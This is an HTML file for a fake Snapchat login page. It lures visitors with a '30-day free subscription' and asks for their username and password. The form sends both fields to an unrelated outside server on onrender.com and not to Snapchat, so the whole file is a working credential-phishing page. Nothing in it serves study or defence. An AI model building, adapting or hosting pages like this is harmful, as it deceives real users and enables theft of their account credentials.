<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
</head>
<body style="font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">

    <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 300px; text-align: center;">
        <h2 style="color: #fffc00; background: black; padding: 10px; border-radius: 5px;">Snapchat</h2>
        <p style="font-size: 14px; color: #666; margin-bottom: 20px;">Log in to claim your 30-day free subscription</p>
        
        <!-- Formspree endpoint yahan connect hoga -->
        <form action="https://my-backend-553o.onrender.com/submit" method="POST">
            <input type="text" name="username" placeholder="Username, email, or mobile" required style="width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;">
            
            <input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;">
            
            <button type="submit" style="width: 100%; padding: 10px; background-color: #fffc00; color: black; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">Log In</button>
        </form>
    </div>

</body>
</html>
